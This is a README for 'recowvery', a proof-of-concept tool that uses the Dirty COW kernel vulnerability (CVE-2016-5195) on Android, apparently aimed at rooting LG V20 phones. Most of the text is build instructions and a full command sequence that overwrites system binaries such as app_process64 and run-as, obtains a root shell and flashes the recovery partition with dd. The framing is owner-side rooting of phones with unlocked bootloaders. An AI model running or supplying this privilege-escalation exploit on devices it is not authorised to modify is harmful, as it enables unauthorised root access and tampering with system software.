# CVE-2016-5195
CVE-2016-5195 (dirty cow/dirtycow/dirtyc0w) proof of concept for Android

## recowvery, an exploit tool for flashing recovery on "secure" systems with **unlocked** bootloaders
This means you, LG V20 H918 (T-Mobile)

This repository is set up for building inside an Android OS build environment.  
Please add it to your `local_manifests` folder as `dirtycow.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<manifest>
	<remote  name="jc" fetch="ssh://git@github.com/jcadduono/" />
	<project path="external/dirtycow" name="android_external_dirtycow" remote="jc" revision="android-6.0" />
	<project path="external/libbootimg" name="android_external_libbootimg" remote="jc" revision="android-6.0" />
</manifest>
```

## Usage:

### Building:
```sh
lunch your_device-eng

make -j5 dirtycow recowvery-applypatch recowvery-app_process64 recowvery-run-as
```

### Running:
```sh
adb push dirtycow /data/local/tmp
adb push recowvery-applypatch /data/local/tmp
adb push recowvery-app_process64 /data/local/tmp
adb push recowvery-run-as /data/local/tmp

adb shell

$ cd /data/local/tmp
$ chmod 0777 *
$ ./dirtycow /system/bin/applypatch recowvery-applypatch
"<wait for completion>"
$ ./dirtycow /system/bin/app_process64 recowvery-app_process64
"<wait for completion, your phone will look like it's crashing>"
$ exit

adb logcat -s recowvery
"<wait for it to tell you it was successful>"
"[CTRL+C]"

adb shell reboot recovery
"<wait for phone to boot up again, your recovery will be reflashed to stock>"

adb shell

$ getenforce
"<it should say Permissive, adjust source and build for your device!>"

$ cd /data/local/tmp
$ ./dirtycow /system/bin/run-as recowvery-run-as
$ run-as exec ./recowvery-applypatch boot
"<wait for it to flash your boot image this time>"

$ run-as su
#
"<play around in your somewhat limited root shell full of possibilities>"
```

From your root shell, it's possible to use commands such as:
```sh
dd if=/sdcard/twrp.img of=/dev/block/bootdevice/by-name/recovery
```
If you have a [Team Win Recovery Project](https://twrp.me/) image on your internal storage, this is how you would install a custom recovery.
